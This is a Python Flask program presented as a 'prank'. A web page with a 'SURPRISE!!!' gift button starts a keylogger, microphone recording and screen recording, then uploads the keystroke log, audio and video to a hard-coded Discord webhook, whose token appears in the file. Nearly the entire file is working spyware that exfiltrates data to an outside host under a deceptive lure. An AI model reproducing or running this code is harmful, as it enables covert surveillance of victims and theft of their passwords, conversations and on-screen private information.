from flask import Flask, render_template_string   
from pynput import keyboard 
import requests
import sounddevice as sd
import numpy as np
import wave
import threading
import cv2
import pyautogui
import time

app = Flask(__name__)

# Discord Webhook configuration
webhook_url = "https://discord.com/api/webhooks/1367970385810948247/HrrVy6NCphTLtxrZimu-W1TmN-FJjCEnNq7-QZ2OABdQK4sOP7KUpTqQAfnamCLKXYvm"  # Replace with your actual Discord webhook URL
file_path = "keylogger2.txt"
audio_file_path = "recorded_audio.wav"
screen_file_path = "recorded_screen.mp4"

# Event to signal stopping of recordings
stop_event = threading.Event()

# Function to write text to the specified file
def write(text):
    with open(file_path, 'a', encoding='utf-8') as f:
        f.write(text)

# Key press handler
def on_key_press(Key):
    try:
        if Key == keyboard.Key.enter:
            write("\n")
        else:
            write(Key.char)
    except AttributeError:
        if Key == keyboard.Key.backspace:
            write("\n[Backspace]\n")
        elif Key == keyboard.Key.tab:
            write("\n[Tab]\n")
        elif Key == keyboard.Key.space:
            write(" ")
        else:
            write(f"[{Key.name}]\n")

def on_key_release(Key):
    if Key == keyboard.Key.esc:
        stop_event.set()  # Signal stop to other threads
        return False  # Stop keylogger listener

# Function to send files to Discord
def send_files_to_discord(webhook_url, file_paths):
    for fp in file_paths:
        try:
            with open(fp, 'rb') as f:
                files = {'file': f}
                response = requests.post(webhook_url, files=files)
            if response.status_code == 200:
                print(f"✅ File '{fp}' sent successfully!")
            else:
                print(f"❌ Failed to send file '{fp}', status code: {response.status_code}")
        except Exception as e:
            print(f"Error sending file {fp}: {e}")

# Record audio function
def record_audio():
    print("Recording audio...")
    fs = 16000
    audio_chunks = []
    while not stop_event.is_set():
        chunk = sd.rec(int(fs), samplerate=fs, channels=1, dtype='float32')
        sd.wait()
        audio_chunks.append(chunk.flatten())
    if audio_chunks:
        audio = np.concatenate(audio_chunks)
    else:
        audio = np.array([], dtype='float32')
    save_audio_to_wav(audio, fs)

def save_audio_to_wav(audio, fs=16000):
    with wave.open(audio_file_path, 'wb') as wavfile:
        wavfile.setnchannels(1)
        wavfile.setsampwidth(2)  # 16-bit
        wavfile.setframerate(fs)
        if len(audio) > 0:
            audio_int16 = (audio * 32767).astype(np.int16)
            wavfile.writeframes(audio_int16.tobytes())
        else:
            # write empty frame if no audio recorded
            wavfile.writeframes(b'')
    print(f"Audio saved to {audio_file_path}")

# Screen recording function
def record_screen():
    print("Starting screen recording...")
    screen_size = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*"mp4v")
    out = cv2.VideoWriter( screen_file_path , fourcc, 20.0, screen_size)
    try:
        while not stop_event.is_set():
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGR2RGB)
            out.write(frame)
            time.sleep(0.05)  # ~20 fps
    finally:
        out.release()
        print(f"Screen recording saved to {screen_file_path}")

# Function to run keylogger
def run_keylogger():
    print("Starting keylogger...")
    with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join()

# Function to start all prank activities
def start_prank_activities():
    # Clear previous keylogger file if exists
    try:
        open(file_path, 'w').close()
    except Exception:
        pass

    stop_event.clear()

    # Start keylogger in a thread
    keylogger_thread = threading.Thread(target=run_keylogger)
    keylogger_thread.start()

    # Start audio recording in a thread
    audio_thread = threading.Thread(target=record_audio)
    audio_thread.start()

    # Start screen recording in a thread
    screen_thread = threading.Thread(target=record_screen)
    screen_thread.start()

    # Wait for keylogger to finish (ESC pressed)
    keylogger_thread.join()
    stop_event.set()  # Just in case

    # Wait for other threads to finish
    audio_thread.join()
    screen_thread.join()

    print("All recordings stopped. Sending files to Discord...")

    # Send all recorded files to Discord
    send_files_to_discord(webhook_url, [file_path, audio_file_path, screen_file_path])

@app.route('/')
def home():
    prank_page_html = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1" />
      <title>HELLO</title>
      <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@600&display=swap');
        body {
          background: linear-gradient(135deg, #f72585, #720026);
          font-family: 'Poppins', sans-serif;
          color: white;
          margin: 0;
          padding: 0;
          height: 100vh;
          display: flex;
          flex-direction: column;
          justify-content: center;
          align-items: center;
          text-align: center;
        }
        h1 {
          font-size: 5rem;
          margin-bottom: 30px;
          text-shadow: 2px 2px 8px rgba(0,0,0,0.4);
        }
        a.button {
          background-color: #4cc9f0;
          color: #03045e;
          padding: 1rem 3rem;
          border-radius: 50px;
          font-weight: 700;
          font-size: 1.5rem;
          text-decoration: none;
          box-shadow: 0 8px 15px rgba(76,201,240,0.4);
          transition: all 0.3s ease;
          user-select: none;
        }
        a.button:hover {
          background-color: #03045e;
          color: #4cc9f0;
          box-shadow: 0 15px 20px rgba(3,4,94,0.6);
          transform: translateY(-3px);
        }
        p.note {
          margin-top: 20px;
          font-size: 1rem;
          opacity: 0.8;
        }
        @media (max-width: 600px) {
          h1 {
            font-size: 3rem;
          }
          a.button {
            font-size: 1.2rem;
            padding: 0.8rem 2rem;
          }
        }
      </style>
    </head>
    <body>
      <h1>CLICK!!!</h1>
      <a href="{{ url_for('start') }}" class="button">SURPRISE!!!</a>
      <p class="note">Click the button to get the gift.</p>
    </body>
    </html>
    """
    return render_template_string(prank_page_html)

@app.route('/start')
def start():
    threading.Thread(target=start_prank_activities).start()
    return """
    <!DOCTYPE html>
    <html lang="en">
    <head><title>HELLO</title></head>
    <body style="font-family: 'Poppins', sans-serif; background:#202020; color:#4cc9f0; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;">
      <h2> You Have Been Pranked!</h2>
    </body>
    </html>
    """

if __name__ == '__main__':
    # webbrowser.open_new('http://127.0.0.1:5000/')  # method1: Open the web page in the default browser

    #method2: Listens on all interfaces making it accessible via local network IP
    app.run(host="0.0.0.0", port=5000)

    # Note: For production, consider using a WSGI server like Gunicorn or uWSGI
    # and a reverse proxy like Nginx for better performance and security.
    # Also, ensure to secure your webhook URL and Flask app in a production environment.
    # This is a simple example and should not be used as-is in production.
